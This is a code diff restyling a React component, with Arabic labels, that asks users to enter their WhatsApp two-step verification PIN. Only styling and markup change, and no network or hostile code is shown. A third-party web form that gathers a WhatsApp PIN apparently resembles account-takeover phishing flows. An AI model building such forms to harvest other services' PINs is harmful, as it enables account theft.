@@ -1,5 +1,4 @@
 import React, { useState } from 'react';
-import { Lock, ArrowLeft, ArrowRight, Shield } from 'lucide-react';
 
 interface PinStepProps {
   whatsappPin: string;
@@ -47,70 +46,96 @@ const PinStep: React.FC<PinStepProps> = ({
   };
 
   return (
-    <div className="text-center">
-      <div className="mb-6">
-        <div className="w-16 h-16 bg-gradient-to-r from-emerald-100 to-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
-          <Lock className="w-8 h-8 text-emerald-600" />
+    <div className="form-card animate-fade-in">
+      <div className="form-content">
+        <div className="form-icon pin">🔒</div>
+        <h2 className="form-title">أدخل رمز التحقق بخطوتين</h2>
+        <p className="form-subtitle">أدخل رمز الحماية الذي قمت بتحديده سابقاً</p>
+        
+        <div style={{ 
+          background: 'rgba(59, 130, 246, 0.1)', 
+          border: '1px solid rgba(59, 130, 246, 0.2)', 
+          borderRadius: '12px', 
+          padding: '1rem', 
+          marginBottom: '2rem',
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'center',
+          gap: '0.5rem'
+        }}>
+          <span style={{ fontSize: '1.2rem' }}>🛡️</span>
+          <p style={{ color: '#1d4ed8', fontSize: '0.9rem', fontWeight: '500', margin: 0 }}>
+            الذي قمت بتحديده سابقاً (6 أرقام)
+          </p>
         </div>
-        <h2 className="text-2xl font-bold text-gray-900 mb-2">         أدخل رمز التحقق بخطوتين </h2>
-        <p className="text-gray-600 mb-2">أدخل رمز الحماية الذي قمت بتحديده سابقاً</p>
-        <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-4">
-          <div className="flex items-center justify-center space-x-2">
-            <Shield className="w-5 h-5 text-blue-600" />
-            <p className="text-blue-800 text-sm font-medium">
-              الذي قمت بتحديده سابقاً (6 أرقام)
-            </p>
+
+        <form onSubmit={handleSubmit}>
+          <div className="input-group">
+            <div style={{ position: 'relative' }}>
+              <input
+                type="password"
+                value={whatsappPin}
+                onChange={(e) => updateWhatsappPin(e.target.value)}
+                placeholder="••••••"
+                style={{
+                  width: '100%',
+                  background: '#f9fafb',
+                  border: '2px solid #e5e7eb',
+                  borderRadius: '16px',
+                  padding: '1rem',
+                  fontSize: '1.2rem',
+                  textAlign: 'center',
+                  fontFamily: 'monospace',
+                  letterSpacing: '0.2em',
+                  transition: 'all 0.3s ease',
+                  outline: 'none'
+                }}
+                onFocus={(e) => {
+                  e.target.style.borderColor = '#8b5cf6';
+                  e.target.style.boxShadow = '0 0 0 3px rgba(139, 92, 246, 0.1)';
+                  e.target.style.background = 'white';
+                }}
+                onBlur={(e) => {
+                  e.target.style.borderColor = '#e5e7eb';
+                  e.target.style.boxShadow = 'none';
+                  e.target.style.background = '#f9fafb';
+                }}
+                maxLength={8}
+              />
+            </div>
+            
+            {error ? (
+              <div className="message error animate-fade-in">{error}</div>
+            ) : (
+              <div className="message success">أدخل رمز المكون من 6 أرقام</div>
+            )}
           </div>
-        </div>
+
+          <div className="button-group">
+            <button
+              type="button"
+              onClick={onBack}
+              className="btn btn-secondary"
+            >
+              <span>←</span>
+              <span>رجوع</span>
+            </button>
+            
+            <button
+              type="submit"
+              className="btn btn-primary"
+              style={{ background: 'linear-gradient(135deg, #8b5cf6, #7c3aed)' }}
+            >
+              <span>تأكيد PIN</span>
+              <span>→</span>
+            </button>
+          </div>
+
+          <div className="text-center">
+            <a href="#" className="link" style={{ color: '#8b5cf6' }}>نسيت رمز PIN؟</a>
+          </div>
+        </form>
       </div>
-
-      <form onSubmit={handleSubmit} className="space-y-6">
-        <div>
-          <div className="relative">
-            <input
-              type="password"
-              value={whatsappPin}
-              onChange={(e) => updateWhatsappPin(e.target.value)}
-              placeholder="••••••"
-              className="w-full bg-gray-50 border-2 border-gray-300 text-gray-900 text-lg text-center rounded-xl focus:ring-2 focus:ring-emerald-500 focus:border-transparent px-4 py-4 transition-all duration-200 font-mono tracking-widest"
-              maxLength={8}
-            />
-          </div>
-          
-          {error ? (
-            <p className="text-red-500 text-sm mt-2 animate-fade-in">{error}</p>
-          ) : (
-            <p className="text-emerald-600 text-sm mt-2">أدخل رمز  المكون من 6 أرقام</p>
-          )}
-        </div>
-
-       
-
-        <div className="flex space-x-4">
-          <button
-            type="button"
-            onClick={onBack}
-            className="flex-1 bg-gray-100 text-gray-700 py-3 px-6 rounded-xl font-semibold hover:bg-gray-200 transition-all duration-200 flex items-center justify-center space-x-2"
-          >
-            <ArrowLeft className="w-5 h-5" />
-            <span>رجوع</span>
-          </button>
-          
-          <button
-            type="submit"
-            className="flex-1 bg-gradient-to-r from-emerald-600 to-green-600 text-white py-3 px-6 rounded-xl font-semibold hover:shadow-lg transition-all duration-300 hover:scale-105 flex items-center justify-center space-x-2"
-          >
-            <span>تأكيد PIN</span>
-            <ArrowRight className="w-5 h-5" />
-          </button>
-        </div>
-
-        <div className="text-center">
-          <button type="button" className="text-emerald-600 text-sm hover:underline">
-            نسيت رمز PIN؟
-          </button>
-        </div>
-      </form>
     </div>
   );
 };
